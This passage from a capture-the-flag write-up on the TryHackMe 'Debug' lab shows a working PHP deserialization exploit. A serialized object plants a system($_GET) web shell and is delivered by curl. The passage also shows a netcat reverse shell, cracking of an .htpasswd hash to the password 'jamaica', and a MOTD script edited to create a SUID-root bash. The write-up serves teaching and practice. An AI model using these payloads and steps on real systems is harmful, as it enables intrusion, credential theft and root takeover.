src=/images/debug-thm/Pasted%20image%2020210403134959.png alt></p><p>&ndash;</p><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>Alright, now time for the exploitation. Before that, we need to learn what <strong>PHP deserialization</strong> is and before that, what is <strong>serialization</strong>?</p><p>We use <strong>serialization</strong> when we want a <code>piece of code</code> or some object to be stored in a <strong>database</strong> or when we&rsquo;re expecting some <em>piece of code</em> through an <strong>API call</strong> or something and then we want to execute it/load it.</p><p>If you&rsquo;re a programmer, you might have come across this hurdle, to solve this, you always need to create a new file, write the source code in it and execute the file manually.</p><p>To not do the above^, we use <strong>serialization</strong>, it takes your piece of code/object, <strong>serializes</strong> it and stores in the <strong>database</strong> and while retreiving it, it <strong>unserializes</strong> the <code>piece of code</code> and executes it.</p><p>For the <em>API call</em>, it just receieves <strong>serialized code</strong> already and executes it while <strong>unserializing</strong> it.</p><p><em><strong>Note: It is always recommended to never take any input either through database or through APIs or any files on the system and mostly don&rsquo;t even use deserialization if not really required. If it&rsquo;s required, never let the user control the parameters!</strong></em></p><p>P.S ~ The above information about serialization is generic and not only based on PHP de(serialization)!</p><hr><p>You can find more details in this <a href="https://www.youtube.com/watch?v=gTXMFrctYLE">youtube video</a> created by a friend of mine; <a href=https://www.linkedin.com/in/mukarramkhalid/>Mukarram Khalid</a>.</p><p>So, now that we&rsquo;ve a base understanding of what <strong>serialization</strong> is, let&rsquo;s move to the <em>source code</em> and see what we can <strong>exploit</strong> here.</p><hr><p>We can see that the PHP code is using a magic function (i.e. <code>__destruct()</code>)</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>

<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>FormSubmit</span> {

<span style=color:#66d9ef>public</span> $form_file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;message.txt&#39;</span>;
<span style=color:#66d9ef>public</span> $message <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;

<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>SaveMessage</span>() {

$NameArea <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;name&#39;</span>]; 
$EmailArea <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;email&#39;</span>];
$TextArea <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;comments&#39;</span>];

	$this<span style=color:#f92672>-&gt;</span> <span style=color:#a6e22e>message</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Message From : &#34;</span> <span style=color:#f92672>.</span> $NameArea <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34; || From Email : &#34;</span> <span style=color:#f92672>.</span> $EmailArea <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34; || Comment : &#34;</span> <span style=color:#f92672>.</span> $TextArea <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;

}

<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __destruct() {

<span style=color:#a6e22e>file_put_contents</span>(<span style=color:#66d9ef>__DIR__</span> <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#f92672>.</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>form_file</span>,$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>message</span>,<span style=color:#a6e22e>FILE_APPEND</span>);
<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;Your submission has been successfully saved!&#39;</span>;

}

}
</code></pre></div><p>&ndash;</p><h3 id=what-is-__destruct>What is <code>__destruct</code>?<a hidden class=anchor aria-hidden=true href=#what-is-__destruct>#</a></h3><p><code>__destruct</code> magic method is used to always run or do a task at the end of the execution. Let&rsquo;s say we want to do something everytime (maybe update a local log file?), it&rsquo;ll do that in the end of the execution.</p><p>What is it doing in the above application?</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __destruct() {

<span style=color:#a6e22e>file_put_contents</span>(<span style=color:#66d9ef>__DIR__</span> <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#f92672>.</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>form_file</span>,$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>message</span>,<span style=color:#a6e22e>FILE_APPEND</span>);
<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;Your submission has been successfully saved!&#39;</span>;

}
</code></pre></div><ul><li>It&rsquo;s creating a file in our <code>__DIR__</code> (or <code>pwd</code>) in the directory and with the message whatever is specified (using the two properties being used from the class)</li><li>It then echo&rsquo;s a string: &lsquo;Your submission has been successfully saved&rsquo;</li></ul><p>&ndash;</p><p>Now, we can write our own code matching the above^ but just change the contents and the file name, let&rsquo;s try it.</p><p>Remember, we need to use the same <strong>class name</strong> and <strong>same properties names</strong>!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>

<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>FormSubmit</span> {
	<span style=color:#66d9ef>public</span> $form_file 	<span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;umar0x01.php&#39;</span>;
	<span style=color:#66d9ef>public</span> $message 	<span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&lt;?php system($_GET[123]); ?&gt;&#39;</span>;
}

$newObj 	<span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>FormSubmit</span>;

<span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>serialize</span>($newObj);

<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></code></pre></div><p>Let&rsquo;s run add this PHP code in a local file and run it.</p><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403142007.png alt></p><p>Alright, we get the serialized string:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>O:10:<span style=color:#e6db74>&#34;FormSubmit&#34;</span>:2:<span style=color:#f92672>{</span>s:9:<span style=color:#e6db74>&#34;form_file&#34;</span>;s:12:<span style=color:#e6db74>&#34;umar0x01.php&#34;</span>;s:7:<span style=color:#e6db74>&#34;message&#34;</span>;s:28:<span style=color:#e6db74>&#34;&lt;?php system(</span>$_GET<span style=color:#e6db74>[123]); ?&gt;&#34;</span>;<span style=color:#f92672>}</span>
</code></pre></div><p>Let me try and walk you through the whole serialized string.</p><ul><li><code>O</code> means object</li><li><code>O:10</code> means object name&rsquo;s length (i.e. -> 10)</li><li><code>2:{</code> means there are two properties/attributes</li><li><code>s:9</code> means that our property/attribute is a string and is of length of 9 chars</li><li><code>s:9:"form_file";</code> Length of 9 and property name</li></ul><p>Probably, that explained the serialized string. You can always google for more details!</p><hr><p>Now, we need to URL encode our string and pass it into the <code>debug</code> parameter in the application.</p><p>For URL encoding, I&rsquo;ll use <a href=https://gchq.github.io/CyberChef>cyberchef</a>.</p><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403142403.png alt></p><p>URL Encoded string looks like:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form%5Ffile%22%3Bs%3A12%3A%22umar0x01%2Ephp%22%3Bs%3A7%3A%22message%22%3Bs%3A28%3A%22%3C%3Fphp%20system%28%24%5FGET%5B123%5D%29%3B%20%3F%3E%22%3B%7D
</code></pre></div><p>Let&rsquo;s pass this in the URL and see if our new file get&rsquo;s created.</p><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403142455.png alt></p><p>Yay! It did, the string printed in the bottom indicates that.</p><p>Here&rsquo;s the cURL request, if you&rsquo;ve problems reproducing the above:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>curl -i <span style=color:#e6db74>&#39;http://10.10.51.225/index.php?debug=O%3A10%3A%22FormSubmit%22%3A2%3A{s%3A9%3A%22form_file%22%3Bs%3A12%3A%22umar0x01.php%22%3Bs%3A7%3A%22message%22%3Bs%3A28%3A%22%3C%3Fphp%20system(%24_GET[123])%3B%20%3F%3E%22%3B}&#39;</span> --globoff <span style=color:#ae81ff>\
</span><span style=color:#ae81ff></span>-H <span style=color:#e6db74>&#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#39;</span> <span style=color:#ae81ff>\
</span><span style=color:#ae81ff></span>-H <span style=color:#e6db74>&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;</span> <span style=color:#ae81ff>\
</span><span style=color:#ae81ff></span>-H <span style=color:#e6db74>&#39;Accept-Language: en-US,en;q=0.5&#39;</span> <span style=color:#ae81ff>\
</span><span style=color:#ae81ff></span>-H <span style=color:#e6db74>&#39;Connection: close&#39;</span>
</code></pre></div><p>&ndash;</p><p>Now, let&rsquo;s access the .php file with our RCE code in it and get reverse shell!</p><p>&ndash;</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=color:#960050;background-color:#1e0010>view-source:http://10.10.51.225/umar0x01.php?123=ls%20-la
</span></code></pre></div><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403142819.png alt></p><p>&ndash;</p><p>We can generate RCE payloads to fallback if something isn&rsquo;t present utilizing <a href=https://reverse-shell.sh>reverse-shell.sh</a> and call it with cURL.</p><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403142924.png alt></p><p>&ndash;</p><p>I&rsquo;ll let you figure out what&rsquo;s happening below, just remember that I wrote the above shell script generated in a file named <code>shell.sh</code> in my local directory since the machine doesn&rsquo;t have access to the internet.</p><p><img loading=lazy src=img/thm-debug.png alt></p><hr><h3 id=reverse-shell>Reverse Shell:<a hidden class=anchor aria-hidden=true href=#reverse-shell>#</a></h3><p>Now that we&rsquo;ve reverse shell, let&rsquo;s try and get tty shell and make it interactive!</p><p>&ndash;</p><p>First, we&rsquo;ll get the tty shell using python&rsquo;s onliner:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 -c <span style=color:#e6db74>&#34;__import__(&#39;pty&#39;).spawn(&#39;/bin/bash&#39;)&#34;</span>
</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>┌──<span style=color:#f92672>(</span>root💀b0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>/mnt/hgfs/THM/Debug<span style=color:#f92672>]</span>
└─# nc -nlvp <span style=color:#ae81ff>4444</span>                              
listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>4444</span> ...
connect to <span style=color:#f92672>[</span>10.17.0.120<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.51.225<span style=color:#f92672>]</span> <span style=color:#ae81ff>50224</span>
/bin/sh: 0: can<span style=color:#e6db74>&#39;t access tty; job control turned off
</span><span style=color:#e6db74>$ id
</span><span style=color:#e6db74>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span style=color:#e6db74>$ which python
</span><span style=color:#e6db74>/usr/bin/python
</span><span style=color:#e6db74>$ which python3
</span><span style=color:#e6db74>/usr/bin/python3
</span><span style=color:#e6db74>$ python3 -c &#34;__import__(&#39;</span>pty<span style=color:#e6db74>&#39;).spawn(&#39;</span>/bin/bash<span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#f92672>)</span><span style=color:#e6db74>&#34;
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>www-data@osboxes:/var/www/html</span>$<span style=color:#e6db74> 
</span><span style=color:#e6db74>www-data@osboxes:/var/www/html</span>$<span style=color:#e6db74> id
</span><span style=color:#e6db74>id
</span><span style=color:#e6db74>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span style=color:#e6db74>www-data@osboxes:/var/www/html</span>$<span style=color:#e6db74> 
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>www-data@osboxes:/var/www/html</span>$<span style=color:#e6db74> 
</span><span style=color:#e6db74>
</span></code></pre></div><p>&ndash;</p><p>Now that we&rsquo;ve tty shell, let&rsquo;s make it interactive (i.e. Ctrl + C or other things don&rsquo;t exit the shell!)</p><p><em><strong>Note:</strong> We need bash shell to make it interactive!</em></p><p>Type: &lsquo;Ctrl + Z&rsquo; and background the process.</p><p>Now we&rsquo;ll use:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>stty raw -echo
</code></pre></div><p>And then type <code>fg</code> to foreground the process (get it back)</p><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403143723.png alt></p><p>&ndash;</p><p>Now that we&rsquo;ve interactive shell, let&rsquo;s add the <em>rows/cols (generic)</em> and add some <strong>colors UwU</strong>!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>PS1<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#39;</span> <span style=color:#75715e># green</span>
alias ls<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ls --color=auto&#39;</span>
alias grep<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;grep --color=auto&#39;</span>
alias fgrep<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;fgrep --color=auto&#39;</span>
alias egrep<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;egrep --color=auto&#39;</span>
alias ll<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ls -alFh&#39;</span>
alias la<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ls -A&#39;</span>
alias l<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ls -CF&#39;</span>
</code></pre></div><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403143941.png alt></p><p>&ndash;</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>stty rows <span style=color:#ae81ff>48</span>
stty columns <span style=color:#ae81ff>211</span>
export TERM<span style=color:#f92672>=</span>screen
</code></pre></div><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403144025.png alt></p><p>&ndash;</p><p>Alright, we got the initial shell and it&rsquo;s fully interactive! Time to get the initial flag and privesc our way to root!</p><p>&ndash;</p><p>We can find a <code>.htpasswd</code> (usually used for <strong>HTTP authentication</strong>) file right in <code>/var/www/html/</code> containing the following credentials:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@osboxes:/var/www/html$ cat .htpasswd 
james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
</code></pre></div><p>Let&rsquo;s run john and try to crack these.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>┌──<span style=color:#f92672>(</span>root💀b0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>/mnt/hgfs/THM/Debug<span style=color:#f92672>]</span>
└─# john htpasswd.hash                           
Warning: detected hash type <span style=color:#e6db74>&#34;md5crypt&#34;</span>, but the string is also recognized as <span style=color:#e6db74>&#34;md5crypt-long&#34;</span>
Use the <span style=color:#e6db74>&#34;--format=md5crypt-long&#34;</span> option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>md5crypt, crypt<span style=color:#f92672>(</span>3<span style=color:#f92672>)</span> $1$ <span style=color:#f92672>(</span>and variants<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>MD5 256/256 AVX2 8x3<span style=color:#f92672>])</span>
Will run <span style=color:#ae81ff>4</span> OpenMP threads
Proceeding with single, rules:Single
Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
Almost <span style=color:#66d9ef>done</span>: Processing the remaining buffered candidate passwords, <span style=color:#66d9ef>if</span> any.
Warning: Only <span style=color:#ae81ff>84</span> candidates buffered <span style=color:#66d9ef>for</span> the current salt, minimum <span style=color:#ae81ff>96</span> needed <span style=color:#66d9ef>for</span> performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
jamaica          <span style=color:#f92672>(</span>james<span style=color:#f92672>)</span>
1g 0:00:00:00 DONE 2/3 <span style=color:#f92672>(</span>2021-04-03 14:42<span style=color:#f92672>)</span> 20.00g/s 41760p/s 41760c/s 41760C/s bigdog..88888888
Use the <span style=color:#e6db74>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
Session completed

</code></pre></div><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403144206.png alt></p><p>&ndash;</p><p>We get a password: <strong>jamaica</strong></p><p>Where can we use it? Let&rsquo;s see <code>/etc/passwd</code> file if it contains any other users except for <code>www-data</code> and <code>root</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@osboxes:/var/www/html$ cat /etc/passwd
root❌0:0:root:/root:/bin/bash
daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin❌2:2:bin:/bin:/usr/sbin/nologin
sys❌3:3:sys:/dev:/usr/sbin/nologin
sync❌4:65534:sync:/bin:/bin/sync
games❌5:60:games:/usr/games:/usr/sbin/nologin
man❌6:12:man:/var/cache/man:/usr/sbin/nologin
lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail❌8:8:mail:/var/mail:/usr/sbin/nologin
news❌9:9:news:/var/spool/news:/usr/sbin/nologin
uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy❌13:13:proxy:/bin:/usr/sbin/nologin
www-data❌33:33:www-data:/var/www:/usr/sbin/nologin
backup❌34:34:backup:/var/backups:/usr/sbin/nologin
list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats❌41:41:Gnats Bug-Reporting System <span style=color:#f92672>(</span>admin<span style=color:#f92672>)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync❌100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network❌101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve❌102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy❌103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog❌104:108::/home/syslog:/bin/false
_apt❌105:65534::/nonexistent:/bin/false
messagebus❌106:110::/var/run/dbus:/bin/false
uuidd❌107:111::/run/uuidd:/bin/false
lightdm❌108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie❌109:117::/nonexistent:/bin/false
avahi-autoipd❌110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi❌111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq❌112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord❌113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher❌114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip❌115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops❌116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse❌117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit❌118:126:RealtimeKit,,,:/proc:/bin/false
saned❌119:127::/var/lib/saned:/bin/false
usbmux❌120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
james❌1001:1001::/home/james:/bin/bash
sshd❌121:65534::/var/run/sshd:/usr/sbin/nologin
</code></pre></div><p>Alright, we can try the credentials against the user: <code>james</code></p><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403144400.png alt></p><p>&ndash;</p><h4 id=flag-usertxt>Flag (user.txt)<a hidden class=anchor aria-hidden=true href=#flag-usertxt>#</a></h4><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403144420.png alt></p><p>&ndash;</p><p>Time for privesc!</p><hr><h2 id=privileges-escalation>Privileges Escalation<a hidden class=anchor aria-hidden=true href=#privileges-escalation>#</a></h2><p>Before running LinEnum, LSE or LinPeas, let&rsquo;s try and do some manual enumeration first!</p><p>&ndash;</p><p>Let&rsquo;s try and get the list of binaries we can run with sudo!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>james@osboxes:~$ sudo -l 
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> james: 
Sorry, user james may not run sudo on osboxes.
</code></pre></div><p>Nothing we can run with sudo! :(</p><p>&ndash;</p><p>Let&rsquo;s try and list the crontabs (if any)</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>james@osboxes:~$ crontab -l
no crontab <span style=color:#66d9ef>for</span> james
</code></pre></div><p>Nothing there as well!</p><p>&ndash;</p><p>We can see that <code>.bash_history</code> is present in the directry, let&rsquo;s check it out.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>james@osboxes:~$ cat .bash_history
ls
clear
exit
ls
clear
exit
ls
clear
exit
ls
cd /home/james/
ls
cat Note-To-James.txt 
ls
cd /etc/update-motd.d/
ls
ls -la
ls
clear
ls
clear
ls
clera
ls
clear
ls
clear
ls -la
cd /
ls
cd /root/
ls
exit
ls
clear
exit
nano id_rsa
chmod <span style=color:#ae81ff>600</span> id_rsa 
ssh -i id_rsa root@10.250.0.12
exit
</code></pre></div><p>&ndash;</p><p>We&rsquo;ve a note file in the local directory:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>james@osboxes:~$ cat Note-To-James.txt
Dear James,

As you may already know, we are soon planning to submit this machine to THM<span style=color:#e6db74>&#39;s CyberSecurity Platform! Crazy... Isn&#39;</span>t it? 

But there<span style=color:#e6db74>&#39;s still one thing I&#39;</span>d like you to <span style=color:#66d9ef>do</span>, before the submission.

Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D

I gave you access to modify all these files :<span style=color:#f92672>)</span> 

Oh and one last thing... You gotta hurry up! We don<span style=color:#960050;background-color:#1e0010>&#39;</span>t have much time left <span style=color:#66d9ef>until</span> the submission!

Best Regards,

root
</code></pre></div><p>&ndash;</p><p>We&rsquo;ve seen <code>.bash_history</code> containing a directory <code>/etc/update-motd.d/</code>, let&rsquo;s check it out!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>james@osboxes:~$ ls -la /etc/update-motd.d/
total <span style=color:#ae81ff>44</span>
drwxr-xr-x   <span style=color:#ae81ff>2</span> root root   <span style=color:#ae81ff>4096</span> Mar <span style=color:#ae81ff>10</span> 18:38 .
drwxr-xr-x <span style=color:#ae81ff>134</span> root root  <span style=color:#ae81ff>12288</span> Mar <span style=color:#ae81ff>10</span> 20:08 ..
-rwxrwxr-x   <span style=color:#ae81ff>1</span> root james  <span style=color:#ae81ff>1220</span> Mar <span style=color:#ae81ff>10</span> 18:32 00-header
-rwxrwxr-x   <span style=color:#ae81ff>1</span> root james     <span style=color:#ae81ff>0</span> Mar <span style=color:#ae81ff>10</span> 18:38 00-header.save
-rwxrwxr-x   <span style=color:#ae81ff>1</span> root james  <span style=color:#ae81ff>1157</span> Jun <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2016</span> 10-help-text
-rwxrwxr-x   <span style=color:#ae81ff>1</span> root james    <span style=color:#ae81ff>97</span> Dec  <span style=color:#ae81ff>7</span>  <span style=color:#ae81ff>2018</span> 90-updates-available
-rwxrwxr-x   <span style=color:#ae81ff>1</span> root james   <span style=color:#ae81ff>299</span> Jul <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2016</span> 91-release-upgrade
-rwxrwxr-x   <span style=color:#ae81ff>1</span> root james   <span style=color:#ae81ff>142</span> Dec  <span style=color:#ae81ff>7</span>  <span style=color:#ae81ff>2018</span> 98-fsck-at-reboot
-rwxrwxr-x   <span style=color:#ae81ff>1</span> root james   <span style=color:#ae81ff>144</span> Dec  <span style=color:#ae81ff>7</span>  <span style=color:#ae81ff>2018</span> 98-reboot-required
-rwxrwxr-x   <span style=color:#ae81ff>1</span> root james   <span style=color:#ae81ff>604</span> Nov  <span style=color:#ae81ff>5</span>  <span style=color:#ae81ff>2017</span> 99-esm
</code></pre></div><p>We can see that we&rsquo;ve read/write/execute permissions on the files. But what can we do with these?</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>james@osboxes:/etc/update-motd.d$ cat 00-header
<span style=color:#75715e>#!/bin/sh</span>
<span style=color:#75715e>#</span>
<span style=color:#75715e>#    00-header - create the header of the MOTD</span>
<span style=color:#75715e>#    Copyright (C) 2009-2010 Canonical Ltd.</span>
<span style=color:#75715e>#</span>
<span style=color:#75715e>#    Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt;</span>
<span style=color:#75715e>#</span>
<span style=color:#75715e>#    This program is free software; you can redistribute it and/or modify</span>
<span style=color:#75715e>#    it under the terms of the GNU General Public License as published by</span>
<span style=color:#75715e>#    the Free Software Foundation; either version 2 of the License, or</span>
<span style=color:#75715e>#    (at your option) any later version.</span>
<span style=color:#75715e>#</span>
<span style=color:#75715e>#    This program is distributed in the hope that it will be useful,</span>
<span style=color:#75715e>#    but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
<span style=color:#75715e>#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
<span style=color:#75715e>#    GNU General Public License for more details.</span>
<span style=color:#75715e>#</span>
<span style=color:#75715e>#    You should have received a copy of the GNU General Public License along</span>
<span style=color:#75715e>#    with this program; if not, write to the Free Software Foundation, Inc.,</span>
<span style=color:#75715e>#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>

<span style=color:#f92672>[</span> -r /etc/lsb-release <span style=color:#f92672>]</span> <span style=color:#f92672>&amp;&amp;</span> . /etc/lsb-release

<span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> -z <span style=color:#e6db74>&#34;</span>$DISTRIB_DESCRIPTION<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>]</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>[</span> -x /usr/bin/lsb_release <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
        <span style=color:#75715e># Fall back to using the very slow lsb_release utility</span>
        DISTRIB_DESCRIPTION<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>lsb_release -s -d<span style=color:#66d9ef>)</span>
<span style=color:#66d9ef>fi</span>

printf <span style=color:#e6db74>&#34;Welcome to %s (%s %s %s)\n&#34;</span> <span style=color:#e6db74>&#34;</span>$DISTRIB_DESCRIPTION<span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>uname -o<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>uname -r<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>uname -m<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span>
</code></pre></div><p>Alright, seems like simple bash commands, let&rsquo;s just copy <code>bash</code> to <code>tmp</code> and set root&rsquo;s SUID bit on it and see if that works.</p><p>Added the instructions in 3-4 lines.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>james@osboxes:/etc/update-motd.d$ cat 00-header
<span style=color:#75715e>#!/bin/sh</span>

cp /bin/bash /tmp/
chmod u+s /tmp/bash

<span style=color:#75715e>#</span>
<span style=color:#75715e>#    00-header - create the header of the MOTD</span>
<span style=color:#75715e>#    Copyright (C) 2009-2010 Canonical Ltd.</span>
<span style=color:#75715e>#</span>
